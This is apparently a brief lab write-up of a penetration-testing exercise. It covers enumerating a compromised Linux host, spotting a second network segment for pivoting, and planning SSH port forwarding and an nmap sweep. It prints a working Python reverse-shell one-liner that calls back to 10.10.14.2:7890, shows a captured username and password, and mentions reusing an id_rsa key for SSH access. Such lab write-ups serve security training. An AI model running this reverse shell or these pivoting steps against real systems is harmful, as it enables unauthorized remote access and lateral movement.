# Assessment

## Enumeration

<figure><img src="../../.gitbook/assets/image (73).png" alt=""><figcaption><p>webadmin</p></figcaption></figure>

Seems to be a Linux host running on this system and there are 2 interfaces as below.

<figure><img src="../../.gitbook/assets/image (59).png" alt=""><figcaption><p>another network segment that we could use to pivot.</p></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (70).png" alt=""><figcaption><p>mlefay:Plain Human work!</p></figcaption></figure>

I decided to get a reverse shell for more control over the foothold sytem.

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.2",7890));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

<figure><img src="../../.gitbook/assets/image (32).png" alt=""><figcaption><p>but it wasn't nessesary</p></figcaption></figure>

I moved the id\_rsa file and ssh to the system with that file. Now I'm in the system with the same credentials but with ssh.

Next I will try to dynamic port forward with ssh.

Then perform nmap scan to find the host that are up.

<figure><img src="../../.gitbook/assets/image (46).png" alt=""><figcaption><p>172.16.5.35</p></figcaption></figure>









